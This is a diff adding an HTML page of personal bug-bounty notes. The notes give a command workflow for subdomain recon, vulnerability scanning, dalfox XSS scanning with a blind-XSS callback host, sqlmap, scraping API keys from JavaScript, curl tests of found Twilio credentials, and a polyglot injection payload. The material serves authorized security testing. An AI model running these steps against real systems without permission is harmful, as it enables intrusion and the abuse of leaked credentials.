@@ -1,0 +1,99 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Bug Bounty</title>
+</head><body><span style="font-size: 14pt">Personal Bug List:<br/>
+- No password policy<br/>
+- XSS &amp; Open redirect (Paramspider + Dalfox)<br/>
+- SQLi (Paramspider + SQLMap)<br/>
+- IDOR<br/>
+- CSRF<br/>
+<br/>
+- Path traversal<br/>
+- SSRF<br/>
+</span><span style="font-size: 14pt">- CSV</span><br/>
+<br/>
+<br/>
+<span style="font-size: 14pt">Bug Bounty Template Attack in target:<br/>
+<br/>
+# Finding subdomains &gt; subs.txt<br/>
+sublist3r -d target.com -o subs.txt<br/>
+# website: subdomainfinder.c99.nl<br/>
+assetfinder target.com | grep "target.com" | tee -a subs.txt # (WARNING: ASSETFINDER CONTAINS OUT OF SCOPE SUBDOMAINS)<br/>
+<br/>
+# Sort and deduplicate found subdomains (dont forget to remove out of scope subdomains)<br/>
+cat subs.txt | sort | uniq | tee uniqs.txt<br/>
+<br/>
+# Detect responding subdomains (pings, my own tool)<br/>
+pings uniqs.txt pings.txt<br/>
+<br/>
+# Detect visit-able subdomains (httpx)<br/>
+httpx -status-code -title -tech-detect -list uniqs.txt -o x.txt<br/>
+#OR (simple output version)<br/>
+httpx -list uniqs.txt -o x.txt<br/>
+<br/>
+# Extract URL only and remove "http/s"from httpx result<br/>
+grep -oP 'https\S+' x.txt | sed 's|https://||' | tee httpx.txt<br/>
+#OR (simple output version)<br/>
+sed 's|https://||' | tee httpx.txt<br/>
+<br/>
+# Automated scanners (only parent domain, for now)<br/>
+nuclei -target target.com | tee nuclei.txt<br/>
+nikto -h target.com | tee.nikto.txt<br/>
+nmap target.com | tee nmap.txt<br/>
+<br/>
+# Find vulnurable subdomains to be taken over<br/>
+subzy run --targets httpx.txt | tee subzy.txt<br/>
+<br/>
+# Find parameters in the visitable subdomains<br/>
+paramspider -l httpx.txt<br/>
+cat results/*.txt | tee paramspider.txt<br/>
+<br/>
+# XSS<br/>
+dalfox file paramspider.txt --remote-payloads portswigger,payloadbox | tee dalfox-remote.txt<br/>
+dalfox file paramspider.txt -b hawhul.xss.ht | tee dalfox-hawhul.txt<br/>
+<br/>
+# SQLi<br/>
+sqlmaps paramspider.txt<br/>
+<br/>
+# Broken Link Hijacking<br/>
+socialhunter -f httpx.txt<br/>
+<br/>
+# Find URLs (directories) (WARNING: WAYBACKURLS PRODUCES OUT OF SCOPE RESULTS and also duplicates)<br/>
+cat uniqs.txt | waybackurls | uniq | tee waybackurls.txt<br/>
+<br/>
+# Removes out of scope subdomains<br/>
+grep -vi "app.target.com" waybackurls.txt &gt; x.txt<br/>
+rm waybackurls.txt<br/>
+mv x.txt waybackurls.txt<br/>
+<br/>
+# Grep config, ini, admin<br/>
+grep "config" waybackurls.txt<br/>
+grep "ini" waybackurls.txt<br/>
+grep "admin" waybackurls.txt<br/>
+<br/>
+# Filter important URLs<br/>
+cat waybackurls.txt | uro | tee uro.txt<br/>
+<br/>
+# Find directories end with ".js"<br/>
+grep ".js$" waybackurls.txt | uniq | tee js.txt<br/>
+# Also filter important found js directories<br/>
+cat waybackurls.txt | uro | tee js-uro.txt<br/>
+<br/>
+# Analyze (find API keys) in js directories<br/>
+<span style="font-family: source-code-pro">cat js.txt | while read url; do secretfinder -i $url -o cli &gt;&gt; secretfinder.txt; done</span><br/>
+<br/>
+# The found API keys could be of use somehow in Keyhacks Github. But I have no idea how to.<br/>
+curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u ACCOUNT_SID:AUTH_TOKEN<br/>
+curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u aCAyOTM2IiBjbGFzcz0iY2xzLTIiIGQ9Ik:AUTH_TOKEN<br/>
+# I got the account sid, but no auth token in secrets.txt<br/>
+<br/>
+# Find directories<br/>
+feroxbuster --url target.com<br/>
+<br/>
+# Payload to test SQLi, CSTI, SSTI, XSS.<br/>
+&nbsp;‘”`&gt;&lt;img src=x&gt;${7*7}<br/>
+# Put it into every input field you see<br/>
+# Please don't ask me how it works. I don't quite understand it either, yet.<br/>
+</span></body></html>
